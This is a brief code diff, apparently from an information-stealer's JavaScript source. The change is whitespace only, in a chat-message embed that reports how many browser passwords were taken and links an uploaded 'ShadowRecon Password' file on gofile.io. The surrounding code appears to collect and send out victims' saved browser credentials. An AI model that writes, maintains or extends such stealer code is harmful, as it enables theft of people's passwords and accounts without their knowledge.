@@ -305,7 +305,7 @@ class Statistics {
                     },
                     {
                         name: "Data:",
-                        value: `:key: - **${stats.browsers.passwords}** Passwords Found\n:file_folder:  - [ShadowRecon Password](${link || 'https://gofile.io'})`
+                        value: `:key: - **${stats.browsers.passwords}** Passwords Found\n:file_folder: - [ShadowRecon Password](${link || 'https://gofile.io'})`
                     }
                 ],
                 footer: {
